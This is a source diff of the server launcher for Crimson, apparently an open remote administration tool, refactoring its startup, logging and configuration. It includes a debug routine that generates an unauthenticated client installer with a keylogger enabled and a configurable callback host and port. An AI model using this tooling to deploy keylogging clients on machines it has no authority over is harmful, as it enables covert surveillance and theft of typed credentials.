@@ -17,51 +17,61 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.server;
 
+import static com.subterranean_security.crimson.universal.Flags.DEV_MODE;
+
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.IOException;
-import java.io.PrintWriter;
 import java.sql.SQLException;
-import java.util.Date;
+import java.util.Base64;
 import java.util.NoSuchElementException;
 import java.util.Scanner;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.misc.EH;
 import com.subterranean_security.crimson.core.misc.HCP;
+import com.subterranean_security.crimson.core.platform.Environment;
 import com.subterranean_security.crimson.core.platform.Platform;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
 import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
-import com.subterranean_security.crimson.core.proto.Misc.AuthMethod;
 import com.subterranean_security.crimson.core.proto.Misc.AuthType;
 import com.subterranean_security.crimson.core.proto.Misc.Outcome;
-import com.subterranean_security.crimson.core.storage.StorageFacility;
+import com.subterranean_security.crimson.core.storage.BasicStorageFacility;
+import com.subterranean_security.crimson.core.store.ConnectionStore;
 import com.subterranean_security.crimson.core.util.FileUtil;
 import com.subterranean_security.crimson.core.util.LogUtil;
 import com.subterranean_security.crimson.core.util.Native;
-import com.subterranean_security.crimson.core.util.RandomUtil;
 import com.subterranean_security.crimson.core.util.TempUtil;
 import com.subterranean_security.crimson.server.net.ServerConnectionStore;
 import com.subterranean_security.crimson.server.storage.ServerDatabase;
-import com.subterranean_security.crimson.server.store.Authentication;
 import com.subterranean_security.crimson.server.store.ListenerStore;
 import com.subterranean_security.crimson.universal.Universal;
 import com.subterranean_security.crimson.universal.Universal.Instance;
 import com.subterranean_security.crimson.universal.stores.DatabaseStore;
 import com.subterranean_security.crimson.universal.stores.PrefStore;
+import com.subterranean_security.crimson.universal.util.JarUtil;
 
 public final class Server {
-	private static final Logger log = LoggerFactory.getLogger(Server.class);
+
+	/**
+	 * Nested class to prevent Logger from getting default configuration
+	 */
+	private static final class Log {
+		public static final Logger log = LoggerFactory.getLogger(Server.class);
+	}
 
 	public static void main(String[] argv) {
-
-		// apply LogBack settings for the session
 		LogUtil.configure();
-		log.info("Launching Crimson Server (build {})", Common.build);
+
+		if (Boolean.parseBoolean(System.getProperty("mode.cloud", "false"))) {
+			Log.log.info("Launching Crimson Server (build {}) in CLOUD mode", Universal.build);
+		} else if (Boolean.parseBoolean(System.getProperty("mode.example", "false"))) {
+			Log.log.info("Launching Crimson Server (build {}) in EXAMPLE mode", Universal.build);
+		} else {
+			Log.log.info("Launching Crimson Server (build {})", Universal.build);
+		}
 
 		// Establish the custom fallback exception handler
 		Thread.setDefaultUncaughtExceptionHandler(new EH());
@@ -74,14 +84,11 @@ public final class Server {
 
 		// Try to get a lock or exit
 		if (PrefStore.getPref().isLocked()) {
-			log.error("A Crimson server is already running in another process");
+			Log.log.error("A Crimson server is already running in another process");
 			System.exit(0);
 		} else {
 			PrefStore.getPref().lock();
 		}
-
-		// Read configuration
-		readConfig();
 
 		// Load native libraries
 		Native.Loader.load();
@@ -89,41 +96,46 @@ public final class Server {
 		// Clear /tmp/
 		TempUtil.clear();
 
-		// Initialize connection stores
-		ServerConnectionStore.initialize();
-
 		// initialize server database
 		initializeDatabase();
 
+		if (Boolean.parseBoolean(System.getProperty("debug-client", "false"))) {
+			installDebugClient();
+		}
+
+		// start listening
+		ListenerStore.load();
+		ListenerStore.startAll();
+
+		// TESTING ONLY!!!!!!
 		try {
-			Common.cvid = DatabaseStore.getDatabase().getInteger("cvid");
-		} catch (NoSuchElementException | SQLException e) {
+			DatabaseStore.getDatabase().store("banner.image", Base64.getEncoder().encodeToString(JarUtil
+					.readResource("/com/subterranean_security/crimson/server/res/img/subterranean_security-405.png")));
+			DatabaseStore.getDatabase().store("banner.text", "Welcome to the official development server");
+		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 
-		ListenerStore.start();
-
-		if (Universal.isDebug && !ServerState.isCloudMode() && !ServerState.isExampleMode()) {
-			installDebugClient();
+		if (DEV_MODE) {
+			ConnectionStore.connectCharcoal();
 		}
 
 		parse();
 	}
 
 	private static void initializeDatabase() {
-		StorageFacility sf = new ServerDatabase(Server.class.getName(),
-				new File(Common.Directories.var.getAbsolutePath() + "/system.db"));
+		BasicStorageFacility sf = new ServerDatabase(new File(Environment.var.getAbsolutePath() + "/system.db"));
 		try {
 			sf.initialize();
 		} catch (ClassNotFoundException e) {
-			log.error("Failed to load SQLite dependancy");
+			Log.log.error("Failed to load SQLite dependancy");
 			System.exit(0);
 		} catch (IOException e) {
-			log.error("Failed to write database");
+			Log.log.error("Failed to write database");
 			System.exit(0);
 		} catch (SQLException e) {
-			log.error("SQL error: {}", e.getMessage());
+			Log.log.error("SQL error: {}", e.getMessage());
 			System.exit(0);
 		}
 
@@ -161,24 +173,18 @@ public final class Server {
 	 * @return Operation outcome
 	 */
 	private static Outcome installDebugClient() {
-
 		Outcome.Builder outcome = Outcome.newBuilder().setResult(true);
 
-		// Use group authentication
-		Outcome authOutcome = Authentication
-				.create(AuthMethod.newBuilder().setCreation(new Date().getTime()).setType(AuthType.GROUP).setId(0)
-						.setName("TESTGROUP").setGroupSeedPrefix(RandomUtil.randString(5)).build());
-
-		if (!authOutcome.getResult()) {
-			return authOutcome;
-		}
-
 		ClientConfig cc = ClientConfig.newBuilder().setOutputType("Java (.jar)").setAuthType(AuthType.NO_AUTH)
-				.addTarget(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build())
-				.addTarget(NetworkTarget.newBuilder().setServer("192.168.1.76").setPort(10101).build())
-				.setPathWin("%USERHOME%/cr_install").setPathBsd("/").setPathLin("%USERHOME%/cr_install")
-				.setPathOsx("%USERHOME%/cr_install").setPathSol("/").setReconnectPeriod(3000)
-				.setBuildNumber(Common.build).setAutostart(false).setKeylogger(true)
+				.addTarget(NetworkTarget.newBuilder().setServer(System.getProperty("debug-client.server", "127.0.0.1"))
+						.setPort(Integer.parseInt(System.getProperty("debug-client.port", "10101"))).build())
+				.setPathWin(System.getProperty("debug-client.path.windows", "%USERHOME%/.crimson/client.jar"))
+				.setPathBsd(System.getProperty("debug-client.path.bsd", "%USERHOME%/.crimson/client.jar"))
+				.setPathLin(System.getProperty("debug-client.path.linux", "%USERHOME%/.crimson/client.jar"))
+				.setPathOsx(System.getProperty("debug-client.path.osx", "%USERHOME%/.crimson/client.jar"))
+				.setPathSol(System.getProperty("debug-client.path.solaris", "%USERHOME%/.crimson/client.jar"))
+				.setReconnectPeriod(Integer.parseInt(System.getProperty("debug-client.connection_period", "3000")))
+				.setBuildNumber(Universal.build).setAutostart(false).setKeylogger(true)
 				.setKeyloggerFlushMethod(Trigger.EVENT).setKeyloggerFlushValue(15).build();
 		try {
 			// Generate installer
@@ -187,92 +193,20 @@ public final class Server {
 
 			// Write installer
 			byte[] res = g.getResult();
-			File installer = new File(System.getProperty("user.home") + "/client.jar");
+			File installer = new File(System.getProperty("user.home") + "/Desktop/crimson/client-installer.jar");
 			FileUtil.writeFile(res, installer);
 
+			// TODO fix
 			// Run installer
-			HCP.run(HCP.HCP_BASE, Platform.osFamily.getJavaw() + " -jar \"" + installer.getAbsolutePath() + "\"");
+			// HCP.run(HCP.HCP_BASE, Platform.osFamily.getJavaw() + " -jar \"" +
+			// installer.getAbsolutePath() + "\"");
 
 		} catch (Exception e) {
-			log.error("Failed to generate debug installer");
+			Log.log.error("Failed to generate debug installer");
 			outcome.setResult(false).setComment(e.getMessage());
 		}
 
 		return outcome.build();
-	}
-
-	// TODO move into a config class
-	private static void readConfig() {
-		File config = new File(Common.Directories.base.getAbsolutePath() + "/server.conf");
-		try {
-			if (!config.exists()) {
-				config.createNewFile();
-
-				// set default
-				setDefaults(config);
-			}
-			Scanner sc = new Scanner(config);
-			while (sc.hasNextLine()) {
-				set(sc.nextLine());
-			}
-			sc.close();
-		} catch (IOException e) {
-			log.warn("Configuration error!");
-
-		}
-
-	}
-
-	private static void setDefaults(File config) {
-		try {
-			PrintWriter pw = new PrintWriter(config);
-			pw.println(Directives.EXAMPLE_MODE + "=false");
-			pw.println(Directives.CLOUD_MODE + "=false");
-			pw.close();
-		} catch (FileNotFoundException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-	}
-
-	private static void set(String s) {
-		String[] p = s.split("=");
-
-		switch (Directives.fromString(p[0])) {
-		case EXAMPLE_MODE: {
-			ServerState.setExampleMode(Boolean.parseBoolean(p[1]));
-			return;
-		}
-		case CLOUD_MODE: {
-			ServerState.setCloudMode(Boolean.parseBoolean(p[1]));
-			return;
-		}
-		}
-	}
-
-	public enum Directives {
-		EXAMPLE_MODE("example-mode"), CLOUD_MODE("cloud-mode");
-
-		private String text;
-
-		Directives(String text) {
-			this.text = text;
-		}
-
-		public String toString() {
-			return this.text;
-		}
-
-		public static Directives fromString(String text) {
-			if (text != null) {
-				for (Directives b : Directives.values()) {
-					if (text.equalsIgnoreCase(b.text)) {
-						return b;
-					}
-				}
-			}
-			return null;
-		}
 	}
 
 }
